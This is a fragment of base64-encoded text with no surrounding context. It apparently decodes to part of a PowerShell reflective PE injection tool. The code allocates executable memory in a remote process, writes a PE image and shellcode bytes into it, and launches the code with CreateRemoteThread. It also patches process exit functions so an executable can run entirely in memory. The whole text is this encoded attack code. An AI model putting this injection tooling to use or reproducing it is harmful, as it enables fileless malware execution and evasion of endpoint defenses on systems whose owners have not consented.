m9jZXNzLCB0aGlzIGlzIHRoZSBhZGRyZXNzIGluIHRoZSByZW1vdGUgcHJvY2Vzcy4KCQlpZiAoJFJlbW90ZUxvYWRpbmcgLWVxICR0cnVlKQoJCXsKCQkJI0FsbG9jYXRlIHNwYWNlIGluIHRoZSByZW1vdGUgcHJvY2VzcywgYW5kIGFsc28gYWxsb2NhdGUgc3BhY2UgaW4gUG93ZXJTaGVsbC4gVGhlIFBFIHdpbGwgYmUgc2V0dXAgaW4gUG93ZXJTaGVsbCBhbmQgY29waWVkIHRvIHRoZSByZW1vdGUgcHJvY2VzcyB3aGVuIGl0IGlzIHNldHVwCgkJCSRQRUhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsQWxsb2MuSW52b2tlKFtJbnRQdHJdOjpaZXJvLCBbVUludFB0cl0kUEVJbmZvLlNpemVPZkltYWdlLCAkV2luMzJDb25zdGFudHMuTUVNX0NPTU1JVCAtYm9yICRXaW4zMkNvbnN0YW50cy5NRU1fUkVTRVJWRSwgJFdpbjMyQ29uc3RhbnRzLlBBR0VfUkVBRFdSSVRFKQoJCQkKCQkJI3RvZG8sIGVycm9yIGhhbmRsaW5nIG5lZWRzIHRvIGRlbGV0ZSB0aGlzIG1lbW9yeSBpZiBhbiBlcnJvciBoYXBwZW5zIGFsb25nIHRoZSB3YXkKCQkJJEVmZmVjdGl2ZVBFSGFuZGxlID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxBbGxvY0V4Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgJExvYWRBZGRyLCBbVUludFB0cl0kUEVJbmZvLlNpemVPZkltYWdlLCAkV2luMzJDb25zdGFudHMuTUVNX0NPTU1JVCAtYm9yICRXaW4zMkNvbnN0YW50cy5NRU1fUkVTRVJWRSwgJFdpbjMyQ29uc3RhbnRzLlBBR0VfRVhFQ1VURV9SRUFEV1JJVEUpCgkJCWlmICgkRWZmZWN0aXZlUEVIYW5kbGUgLWVxIFtJbnRQdHJdOjpaZXJvKQoJCQl7CgkJCQlUaHJvdyAiVW5hYmxlIHRvIGFsbG9jYXRlIG1lbW9yeSBpbiB0aGUgcmVtb3RlIHByb2Nlc3MuIElmIHRoZSBQRSBiZWluZyBsb2FkZWQgZG9lc24ndCBzdXBwb3J0IEFTTFIsIGl0IGNvdWxkIGJlIHRoYXQgdGhlIHJlcXVlc3RlZCBiYXNlIGFkZHJlc3Mgb2YgdGhlIFBFIGlzIGFscmVhZHkgaW4gdXNlIgoJCQl9CgkJfQoJCWVsc2UKCQl7CgkJCWlmICgkTlhDb21wYXRpYmxlIC1lcSAkdHJ1ZSkKCQkJewoJCQkJJFBFSGFuZGxlID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxBbGxvYy5JbnZva2UoJExvYWRBZGRyLCBbVUludFB0cl0kUEVJbmZvLlNpemVPZkltYWdlLCAkV2luMzJDb25zdGFudHMuTUVNX0NPTU1JVCAtYm9yICRXaW4zMkNvbnN0YW50cy5NRU1fUkVTRVJWRSwgJFdpbjMyQ29uc3RhbnRzLlBBR0VfUkVBRFdSSVRFKQoJCQl9CgkJCWVsc2UKCQkJewoJCQkJJFBFSGFuZGxlID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxBbGxvYy5JbnZva2UoJExvYWRBZGRyLCBbVUludFB0cl0kUEVJbmZvLlNpemVPZkltYWdlLCAkV2luMzJDb25zdGFudHMuTUVNX0NPTU1JVCAtYm9yICRXaW4zMkNvbnN0YW50cy5NRU1fUkVTRVJWRSwgJFdpbjMyQ29uc3RhbnRzLlBBR0VfRVhFQ1VURV9SRUFEV1JJVEUpCgkJCX0KCQkJJEVmZmVjdGl2ZVBFSGFuZGxlID0gJFBFSGFuZGxlCgkJfQoJCQoJCVtJbnRQdHJdJFBFRW5kQWRkcmVzcyA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkUEVIYW5kbGUpIChbSW50NjRdJFBFSW5mby5TaXplT2ZJbWFnZSkKCQlpZiAoJFBFSGFuZGxlIC1lcSBbSW50UHRyXTo6WmVybykKCQl7IAoJCQlUaHJvdyAiVmlydHVhbEFsbG9jIGZhaWxlZCB0byBhbGxvY2F0ZSBtZW1vcnkgZm9yIFBFLiBJZiBQRSBpcyBub3QgQVNMUiBjb21wYXRpYmxlLCB0cnkgcnVubmluZyB0aGUgc2NyaXB0IGluIGEgbmV3IFBvd2VyU2hlbGwgcHJvY2VzcyAodGhlIG5ldyBQb3dlclNoZWxsIHByb2Nlc3Mgd2lsbCBoYXZlIGEgZGlmZmVyZW50IG1lbW9yeSBsYXlvdXQsIHNvIHRoZSBhZGRyZXNzIHRoZSBQRSB3YW50cyBtaWdodCBiZSBmcmVlKS4iCgkJfQkJCgkJW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkUEVCeXRlcywgMCwgJFBFSGFuZGxlLCAkUEVJbmZvLlNpemVPZkhlYWRlcnMpIHwgT3V0LU51bGwKCQkKCQkKCQkjTm93IHRoYXQgdGhlIFBFIGlzIGluIG1lbW9yeSwgZ2V0IG1vcmUgZGV0YWlsZWQgaW5mb3JtYXRpb24gYWJvdXQgaXQKCQlXcml0ZS1WZXJib3NlICJHZXR0aW5nIGRldGFpbGVkIFBFIGluZm9ybWF0aW9uIGZyb20gdGhlIGhlYWRlcnMgbG9hZGVkIGluIG1lbW9yeSIKCQkkUEVJbmZvID0gR2V0LVBFRGV0YWlsZWRJbmZvIC1QRUhhbmRsZSAkUEVIYW5kbGUgLVdpbjMyVHlwZXMgJFdpbjMyVHlwZXMgLVdpbjMyQ29uc3RhbnRzICRXaW4zMkNvbnN0YW50cwoJCSRQRUluZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBFbmRBZGRyZXNzIC1WYWx1ZSAkUEVFbmRBZGRyZXNzCgkJJFBFSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIEVmZmVjdGl2ZVBFSGFuZGxlIC1WYWx1ZSAkRWZmZWN0aXZlUEVIYW5kbGUKCQlXcml0ZS1WZXJib3NlICJTdGFydEFkZHJlc3M6ICQoR2V0LUhleCAkUEVIYW5kbGUpICAgIEVuZEFkZHJlc3M6ICQoR2V0LUhleCAkUEVFbmRBZGRyZXNzKSIKCQkKCQkKCQkjQ29weSBlYWNoIHNlY3Rpb24gZnJvbSB0aGUgUEUgaW4gdG8gbWVtb3J5CgkJV3JpdGUtVmVyYm9zZSAiQ29weSBQRSBzZWN0aW9ucyBpbiB0byBtZW1vcnkiCgkJQ29weS1TZWN0aW9ucyAtUEVCeXRlcyAkUEVCeXRlcyAtUEVJbmZvICRQRUluZm8gLVdpbjMyRnVuY3Rpb25zICRXaW4zMkZ1bmN0aW9ucyAtV2luMzJUeXBlcyAkV2luMzJUeXBlcwoJCQoJCQoJCSNVcGRhdGUgdGhlIG1lbW9yeSBhZGRyZXNzZXMgaGFyZGNvZGVkIGluIHRvIHRoZSBQRSBiYXNlZCBvbiB0aGUgbWVtb3J5IGFkZHJlc3MgdGhlIFBFIHdhcyBleHBlY3RpbmcgdG8gYmUgbG9hZGVkIHRvIHZzIHdoZXJlIGl0IHdhcyBhY3R1YWxseSBsb2FkZWQKCQlXcml0ZS1WZXJib3NlICJVcGRhdGUgbWVtb3J5IGFkZHJlc3NlcyBiYXNlZCBvbiB3aGVyZSB0aGUgUEUgd2FzIGFjdHVhbGx5IGxvYWRlZCBpbiBtZW1vcnkiCgkJVXBkYXRlLU1lbW9yeUFkZHJlc3NlcyAtUEVJbmZvICRQRUluZm8gLU9yaWdpbmFsSW1hZ2VCYXNlICRPcmlnaW5hbEltYWdlQmFzZSAtV2luMzJDb25zdGFudHMgJFdpbjMyQ29uc3RhbnRzIC1XaW4zMlR5cGVzICRXaW4zMlR5cGVzCgoJCQoJCSNUaGUgUEUgd2UgYXJlIGluLW1lbW9yeSBsb2FkaW5nIGhhcyBETExzIGl0IG5lZWRzLCBpbXBvcnQgdGhvc2UgRExMcyBmb3IgaXQKCQlXcml0ZS1WZXJib3NlICJJbXBvcnQgRExMJ3MgbmVlZGVkIGJ5IHRoZSBQRSB3ZSBhcmUgbG9hZGluZyIKCQlpZiAoJFJlbW90ZUxvYWRpbmcgLWVxICR0cnVlKQoJCXsKCQkJSW1wb3J0LURsbEltcG9ydHMgLVBFSW5mbyAkUEVJbmZvIC1XaW4zMkZ1bmN0aW9ucyAkV2luMzJGdW5jdGlvbnMgLVdpbjMyVHlwZXMgJFdpbjMyVHlwZXMgLVdpbjMyQ29uc3RhbnRzICRXaW4zMkNvbnN0YW50cyAtUmVtb3RlUHJvY0hhbmRsZSAkUmVtb3RlUHJvY0hhbmRsZQoJCX0KCQllbHNlCgkJewoJCQlJbXBvcnQtRGxsSW1wb3J0cyAtUEVJbmZvICRQRUluZm8gLVdpbjMyRnVuY3Rpb25zICRXaW4zMkZ1bmN0aW9ucyAtV2luMzJUeXBlcyAkV2luMzJUeXBlcyAtV2luMzJDb25zdGFudHMgJFdpbjMyQ29uc3RhbnRzCgkJfQoJCQoJCQoJCSNVcGRhdGUgdGhlIG1lbW9yeSBwcm90ZWN0aW9uIGZsYWdzIGZvciBhbGwgdGhlIG1lbW9yeSBqdXN0IGFsbG9jYXRlZAoJCWlmICgkUmVtb3RlTG9hZGluZyAtZXEgJGZhbHNlKQoJCXsKCQkJaWYgKCROWENvbXBhdGlibGUgLWVxICR0cnVlKQoJCQl7CgkJCQlXcml0ZS1WZXJib3NlICJVcGRhdGUgbWVtb3J5IHByb3RlY3Rpb24gZmxhZ3MiCgkJCQlVcGRhdGUtTWVtb3J5UHJvdGVjdGlvbkZsYWdzIC1QRUluZm8gJFBFSW5mbyAtV2luMzJGdW5jdGlvbnMgJFdpbjMyRnVuY3Rpb25zIC1XaW4zMkNvbnN0YW50cyAkV2luMzJDb25zdGFudHMgLVdpbjMyVHlwZXMgJFdpbjMyVHlwZXMKCQkJfQoJCQllbHNlCgkJCXsKCQkJCVdyaXRlLVZlcmJvc2UgIlBFIGJlaW5nIHJlZmxlY3RpdmVseSBsb2FkZWQgaXMgbm90IGNvbXBhdGlibGUgd2l0aCBOWCBtZW1vcnksIGtlZXBpbmcgbWVtb3J5IGFzIHJlYWQgd3JpdGUgZXhlY3V0ZSIKCQkJfQoJCX0KCQllbHNlCgkJewoJCQlXcml0ZS1WZXJib3NlICJQRSBiZWluZyBsb2FkZWQgaW4gdG8gYSByZW1vdGUgcHJvY2Vzcywgbm90IGFkanVzdGluZyBtZW1vcnkgcGVybWlzc2lvbnMiCgkJfQoJCQoJCQoJCSNJZiByZW1vdGUgbG9hZGluZywgY29weSB0aGUgRExMIGluIHRvIHJlbW90ZSBwcm9jZXNzIG1lbW9yeQoJCWlmICgkUmVtb3RlTG9hZGluZyAtZXEgJHRydWUpCgkJewoJCQlbVUludDMyXSROdW1CeXRlc1dyaXR0ZW4gPSAwCgkJCSRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLldyaXRlUHJvY2Vzc01lbW9yeS5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRFZmZlY3RpdmVQRUhhbmRsZSwgJFBFSGFuZGxlLCBbVUludFB0cl0oJFBFSW5mby5TaXplT2ZJbWFnZSksIFtSZWZdJE51bUJ5dGVzV3JpdHRlbikKCQkJaWYgKCRTdWNjZXNzIC1lcSAkZmFsc2UpCgkJCXsKCQkJCVRocm93ICJVbmFibGUgdG8gd3JpdGUgc2hlbGxjb2RlIHRvIHJlbW90ZSBwcm9jZXNzIG1lbW9yeS4iCgkJCX0KCQl9CgkJCgkJCgkJI0NhbGwgdGhlIGVudHJ5IHBvaW50LCBpZiB0aGlzIGlzIGEgRExMIHRoZSBlbnRyeXBvaW50IGlzIHRoZSBEbGxNYWluIGZ1bmN0aW9uLCBpZiBpdCBpcyBhbiBFWEUgaXQgaXMgdGhlIE1haW4gZnVuY3Rpb24KCQlpZiAoJFBFSW5mby5GaWxlVHlwZSAtaWVxICJETEwiKQoJCXsKCQkJaWYgKCRSZW1vdGVMb2FkaW5nIC1lcSAkZmFsc2UpCgkJCXsKCQkJCVdyaXRlLVZlcmJvc2UgIkNhbGxpbmcgZGxsbWFpbiBzbyB0aGUgRExMIGtub3dzIGl0IGhhcyBiZWVuIGxvYWRlZCIKCQkJCSREbGxNYWluUHRyID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKCRQRUluZm8uUEVIYW5kbGUpICgkUEVJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuQWRkcmVzc09mRW50cnlQb2ludCkKCQkJCSREbGxNYWluRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtVSW50MzJdLCBbSW50UHRyXSkgKFtCb29sXSkKCQkJCSREbGxNYWluID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJERsbE1haW5QdHIsICREbGxNYWluRGVsZWdhdGUpCgkJCQkKCQkJCSREbGxNYWluLkludm9rZSgkUEVJbmZvLlBFSGFuZGxlLCAxLCBbSW50UHRyXTo6WmVybykgfCBPdXQtTnVsbAoJCQl9CgkJCWVsc2UKCQkJewoJCQkJJERsbE1haW5QdHIgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoJEVmZmVjdGl2ZVBFSGFuZGxlKSAoJFBFSW5mby5JTUFHRV9OVF9IRUFERVJTLk9wdGlvbmFsSGVhZGVyLkFkZHJlc3NPZkVudHJ5UG9pbnQpCgkJCQoJCQkJaWYgKCRQRUluZm8uUEU2NEJpdCAtZXEgJHRydWUpCgkJCQl7CgkJCQkJI1NoZWxsY29kZTogQ2FsbERsbE1haW4uYXNtCgkJCQkJJENhbGxEbGxNYWluU0MxID0gQCgweDUzLCAweDQ4LCAweDg5LCAweGUzLCAweDY2LCAweDgzLCAweGU0LCAweDAwLCAweDQ4LCAweGI5KQoJCQkJCSRDYWxsRGxsTWFpblNDMiA9IEAoMHhiYSwgMHgwMSwgMHgwMCwgMHgwMCwgMHgwMCwgMHg0MSwgMHhiOCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHg0OCwgMHhiOCkKCQkJCQkkQ2FsbERsbE1haW5TQzMgPSBAKDB4ZmYsIDB4ZDAsIDB4NDgsIDB4ODksIDB4ZGMsIDB4NWIsIDB4YzMpCgkJCQl9CgkJCQllbHNlCgkJCQl7CgkJCQkJI1NoZWxsY29kZTogQ2FsbERsbE1haW4uYXNtCgkJCQkJJENhbGxEbGxNYWluU0MxID0gQCgweDUzLCAweDg5LCAweGUzLCAweDgzLCAweGU0LCAweGYwLCAweGI5KQoJCQkJCSRDYWxsRGxsTWFpblNDMiA9IEAoMHhiYSwgMHgwMSwgMHgwMCwgMHgwMCwgMHgwMCwgMHhiOCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHg1MCwgMHg1MiwgMHg1MSwgMHhiOCkKCQkJCQkkQ2FsbERsbE1haW5TQzMgPSBAKDB4ZmYsIDB4ZDAsIDB4ODksIDB4ZGMsIDB4NWIsIDB4YzMpCgkJCQl9CgkJCQkkU0NMZW5ndGggPSAkQ2FsbERsbE1haW5TQzEuTGVuZ3RoICsgJENhbGxEbGxNYWluU0MyLkxlbmd0aCArICRDYWxsRGxsTWFpblNDMy5MZW5ndGggKyAoJFB0clNpemUgKiAyKQoJCQkJJFNDUFNNZW0gPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoJFNDTGVuZ3RoKQoJCQkJJFNDUFNNZW1PcmlnaW5hbCA9ICRTQ1BTTWVtCgkJCQkKCQkJCVdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRDYWxsRGxsTWFpblNDMSAtTWVtb3J5QWRkcmVzcyAkU0NQU01lbQoJCQkJJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJENhbGxEbGxNYWluU0MxLkxlbmd0aCkKCQkJCVtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cnVjdHVyZVRvUHRyKCRFZmZlY3RpdmVQRUhhbmRsZSwgJFNDUFNNZW0sICRmYWxzZSkKCQkJCSRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRQdHJTaXplKQoJCQkJV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJENhbGxEbGxNYWluU0MyIC1NZW1vcnlBZGRyZXNzICRTQ1BTTWVtCgkJCQkkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkQ2FsbERsbE1haW5TQzIuTGVuZ3RoKQoJCQkJW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJERsbE1haW5QdHIsICRTQ1BTTWVtLCAkZmFsc2UpCgkJCQkkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkUHRyU2l6ZSkKCQkJCVdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRDYWxsRGxsTWFpblNDMyAtTWVtb3J5QWRkcmVzcyAkU0NQU01lbQoJCQkJJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJENhbGxEbGxNYWluU0MzLkxlbmd0aCkKCQkJCQoJCQkJJFJTQ0FkZHIgPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbEFsbG9jRXguSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCBbSW50UHRyXTo6WmVybywgW1VJbnRQdHJdW1VJbnQ2NF0kU0NMZW5ndGgsICRXaW4zMkNvbnN0YW50cy5NRU1fQ09NTUlUIC1ib3IgJFdpbjMyQ29uc3RhbnRzLk1FTV9SRVNFUlZFLCAkV2luMzJDb25zdGFudHMuUEFHRV9FWEVDVVRFX1JFQURXUklURSkKCQkJCWlmICgkUlNDQWRkciAtZXEgW0ludFB0cl06Olplcm8pCgkJCQl7CgkJCQkJVGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSBtZW1vcnkgaW4gdGhlIHJlbW90ZSBwcm9jZXNzIGZvciBzaGVsbGNvZGUiCgkJCQl9CgkJCQkKCQkJCSRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLldyaXRlUHJvY2Vzc01lbW9yeS5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRSU0NBZGRyLCAkU0NQU01lbU9yaWdpbmFsLCBbVUludFB0cl1bVUludDY0XSRTQ0xlbmd0aCwgW1JlZl0kTnVtQnl0ZXNXcml0dGVuKQoJCQkJaWYgKCgkU3VjY2VzcyAtZXEgJGZhbHNlKSAtb3IgKFtVSW50NjRdJE51bUJ5dGVzV3JpdHRlbiAtbmUgW1VJbnQ2NF0kU0NMZW5ndGgpKQoJCQkJewoJCQkJCVRocm93ICJVbmFibGUgdG8gd3JpdGUgc2hlbGxjb2RlIHRvIHJlbW90ZSBwcm9jZXNzIG1lbW9yeS4iCgkJCQl9CgoJCQkJJFJUaHJlYWRIYW5kbGUgPSBDcmVhdGUtUmVtb3RlVGhyZWFkIC1Qcm9jZXNzSGFuZGxlICRSZW1vdGVQcm9jSGFuZGxlIC1TdGFydEFkZHJlc3MgJFJTQ0FkZHIgLVdpbjMyRnVuY3Rpb25zICRXaW4zMkZ1bmN0aW9ucwoJCQkJJFJlc3VsdCA9ICRXaW4zMkZ1bmN0aW9ucy5XYWl0Rm9yU2luZ2xlT2JqZWN0Lkludm9rZSgkUlRocmVhZEhhbmRsZSwgMjAwMDApCgkJCQlpZiAoJFJlc3VsdCAtbmUgMCkKCQkJCXsKCQkJCQlUaHJvdyAiQ2FsbCB0byBDcmVhdGVSZW1vdGVUaHJlYWQgdG8gY2FsbCBHZXRQcm9jQWRkcmVzcyBmYWlsZWQuIgoJCQkJfQoJCQkJCgkJCQkkV2luMzJGdW5jdGlvbnMuVmlydHVhbEZyZWVFeC5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRSU0NBZGRyLCBbVUludFB0cl1bVUludDY0XTAsICRXaW4zMkNvbnN0YW50cy5NRU1fUkVMRUFTRSkgfCBPdXQtTnVsbAoJCQl9CgkJfQoJCWVsc2VpZiAoJFBFSW5mby5GaWxlVHlwZSAtaWVxICJFWEUiKQoJCXsKCQkJI092ZXJ3cml0ZSBHZXRDb21tYW5kTGluZSBhbmQgRXhpdFByb2Nlc3Mgc28gd2UgY2FuIHByb3ZpZGUgb3VyIG93biBhcmd1bWVudHMgdG8gdGhlIEVYRSBhbmQgcHJldmVudCBpdCBmcm9tIGtpbGxpbmcgdGhlIFBTIHByb2Nlc3MKCQkJW0ludFB0cl0kRXhlRG9uZUJ5dGVQdHIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoMSkKCQkJW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6V3JpdGVCeXRlKCRFeGVEb25lQnl0ZVB0ciwgMCwgMHgwMCkKCQkJJE92ZXJ3cml0dGVuTWVtSW5mbyA9IFVwZGF0ZS1FeGVGdW5jdGlvbnMgLVBFSW5mbyAkUEVJbmZvIC1XaW4zMkZ1bmN0aW9ucyAkV2luMzJGdW5jdGlvbnMgLVdpbjMyQ29uc3RhbnRzICRXaW4zMkNvbnN0YW50cyAtRXhlQXJndW1lbnRzICRFeGVBcmdzIC1FeGVEb25lQnl0ZVB0ciAkRXhlRG9uZUJ5dGVQdHIKCgkJCSNJZiB0aGlzIGlzIGFuIEVYRSwgY2FsbCB0aGUgZW50cnkgcG9pbnQgaW4gYSBuZXcgdGhyZWFkLiBXZSBoYXZlIG92ZXJ3cml0dGVuIHRoZSBFeGl0UHJvY2VzcyBmdW5jdGlvbiB0byBpbnN0ZWFkIEV4aXRUaHJlYWQKCQkJIwlUaGlzIHdheSB0aGUgcmVmbGVjdGl2ZWx5IGxvYWRlZCBFWEUgd29uJ3Qga2lsbCB0aGUgcG93ZXJzaGVsbCBwcm9jZXNzIHdoZW4gaXQgZXhpdHMsIGl0IHdpbGwganVzdCBraWxsIGl0cyBvd24gdGhyZWFkLgoJCQlbSW50UHRyXSRFeGVNYWluUHRyID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKCRQRUluZm8uUEVIYW5kbGUpICgkUEVJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuQWRkcmVzc09mRW50cnlQb2ludCkKCQkJV3JpdGUtVmVyYm9zZSAiQ2FsbCBFWEUgTWFpbiBmdW5jdGlvbi4gQWRkcmVzczogJChHZXQtSGV4ICRFeGVNYWluUHRyKS4gQ3JlYXRpbmcgdGhyZWFkIGZvciB0aGUgRVhFIHRvIHJ1biBpbi4iCgoJCQkkV2luMzJGdW5jdGlvbnMuQ3JlYXRlVGhyZWFkLkludm9rZShbSW50UHRyXTo6WmVybywgW0ludFB0cl06Olplcm8sICRFeGVNYWluUHRyLCBbSW50UHRyXTo6WmVybywgKFtVSW50MzJdMCksIFtSZWZdKFtVSW50MzJdMCkpIHwgT3V0LU51bGwKCgkJCXdoaWxlKCR0cnVlKQoJCQl7CgkJCQlbQnl0ZV0kVGhyZWFkRG9uZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlJlYWRCeXRlKCRFeGVEb25lQnl0ZVB0ciwgMCkKCQkJCWlmICgkVGhyZWFkRG9uZSAtZXEgMSkKCQkJCXsKCQkJCQlDb3B5LUFycmF5T2ZNZW1BZGRyZXNzZXMgLUNvcHlJbmZvICRPdmVyd3JpdHRlbk1lbUluZm8gLVdpbjMyRnVuY3Rpb25zICRXaW4zMkZ1bmN0aW9ucyAtV2luMzJDb25zdGFudHMgJFdpbjMyQ29uc3RhbnRzCgkJCQkJV3JpdGUtVmVyYm9zZSAiRVhFIHRocmVhZCBoYXMgY29tcGxldGVkLiIKCQkJCQlicmVhawoJCQkJfQoJCQkJZWxzZQoJCQkJewoJCQkJCVN0YXJ0LVNsZWVwIC1TZWNvbmRzIDEKCQkJCX0KCQkJfQoJCX0KCQkKCQlyZXR1cm4gQCgkUEVJbmZvLlBFSGFuZGxlLCAkRWZmZWN0aXZlUEVIYW5kbGUpCgl9CgkKCQoJRnVuY3Rpb24gSW52b2tlLU1lbW9yeUZyZWVMaWJyYXJ5Cgl7CgkJUGFyYW0oCgkJW1BhcmFtZXRlcihQb3NpdGlvbj0wLCBNYW5kYXRvcnk9JHRydWUpXQoJCVtJbnRQdHJdCgkJJFBFSGFuZGxlCgkJKQoJCQoJCSNHZXQgV2luMzIgY29uc3RhbnRzIGFuZCBmdW5jdGlvbnMKCQkkV2luMzJDb25zdGFudHMgPSBHZXQtV2luMzJDb25zdGFudHMKCQkkV2luMzJGdW5jdGlvbnMgPSBHZXQtV2luMzJGdW5jdGlvbnMKCQkkV2luMzJUeXBlcyA9IEdldC1XaW4zMlR5cGVzCgkJCgkJJFBFSW5mbyA9IEdldC1QRURldGFpbGVkSW5mbyAtUEVIYW5kbGUgJFBFSGFuZGxlIC1XaW4zMlR5cGVzICRXaW4zMlR5cGVzIC1XaW4zMkNvbnN0YW50cyAkV2luMzJDb25zdGFudHMKCQkKCQkjQ2FsbCBGcmVlTGlicmFyeSBmb3IgYWxsIHRoZSBpbXBvcnRzIG9mIHRoZSBETEwKCQlpZiAoJFBFSW5mby5JTUFHRV9OVF9IRUFERVJTLk9wdGlvbmFsSGVhZGVyLkltcG9ydFRhYmxlLlNpemUgLWd0IDApCgkJewoJCQlbSW50UHRyXSRJbXBvcnREZXNjcmlwdG9yUHRyID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kUEVJbmZvLlBFSGFuZGxlKSAoW0ludDY0XSRQRUluZm8uSU1BR0VfTlRfSEVBREVSUy5PcHRpb25hbEhlYWRlci5JbXBvcnRUYWJsZS5WaXJ0dWFsQWRkcmVzcykKCQkJCgkJCXdoaWxlICgkdHJ1ZSkKCQkJewoJCQkJJEltcG9ydERlc2NyaXB0b3IgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkSW1wb3J0RGVzY3JpcHRvclB0ciwgW1R5cGVdJFdpbjMyVHlwZXMuSU1BR0VfSU1QT1JUX0RFU0NSSVBUT1IpCgkJCQkKCQkJCSNJZiB0aGUgc3RydWN0dXJlIGlzIG51bGwsIGl0IHNpZ25hbHMgdGhhdCB0aGlzIGlzIHRoZSBlbmQgb2YgdGhlIGFycmF5CgkJCQlpZiAoJEltcG9ydERlc2NyaXB0b3IuQ2hhcmFjdGVyaXN0aWNzIC1lcSAwIGAKCQkJCQkJLWFuZCAkSW1wb3J0RGVzY3JpcHRvci5GaXJzdFRodW5rIC1lcSAwIGAKCQkJCQkJLWFuZCAkSW1wb3J0RGVzY3JpcHRvci5Gb3J3YXJkZXJDaGFpbiAtZXEgMCBgCgkJCQkJCS1hbmQgJEltcG9ydERlc2NyaXB0b3IuTmFtZSAtZXEgMCBgCgkJCQkJCS1hbmQgJEltcG9ydERlc2NyaXB0b3IuVGltZURhdGVTdGFtcCAtZXEgMCkKCQkJCXsKCQkJCQlXcml0ZS1WZXJib3NlICJEb25lIHVubG9hZGluZyB0aGUgbGlicmFyaWVzIG5lZWRlZCBieSB0aGUgUEUiCgkJCQkJYnJlYWsKCQkJCX0KCgkJCQkkSW1wb3J0RGxsUGF0aCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RyaW5nQW5zaSgoQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kUEVJbmZvLlBFSGFuZGxlKSAoW0ludDY0XSRJbXBvcnREZXNjcmlwdG9yLk5hbWUpKSkKCQkJCSRJbXBvcnREbGxIYW5kbGUgPSAkV2luMzJGdW5jdGlvbnMuR2V0TW9kdWxlSGFuZGxlLkludm9rZSgkSW1wb3J0RGxsUGF0aCkKCgkJCQlpZiAoJEltcG9ydERsbEhhbmRsZSAtZXEgJG51bGwpCgkJCQl7CgkJCQkJV3JpdGUtV2FybmluZyAiRXJyb3IgZ2V0dGluZyBETEwgaGFuZGxlIGluIE1lbW9yeUZyZWVMaWJyYXJ5LCBETExOYW1lOiAkSW1wb3J0RGxsUGF0aC4gQ29udGludWluZyBhbnl3YXlzIiAtV2FybmluZ0FjdGlvbiBDb250aW51ZQoJCQkJfQoJCQkJCgkJCQkkU3VjY2VzcyA9ICRXaW4zMkZ1bmN0aW9ucy5GcmVlTGlicmFyeS5JbnZva2UoJEltcG9ydERsbEhhbmRsZSkKCQkJCWlmICgkU3VjY2VzcyAtZXEgJGZhbHNlKQoJCQkJewoJCQkJCVdyaXRlLVdhcm5pbmcgIlVuYWJsZSB0byBmcmVlIGxpYnJhcnk6ICRJbXBvcnREbGxQYXRoLiBDb250aW51aW5nIGFueXdheXMuIiAtV2FybmluZ0Fjd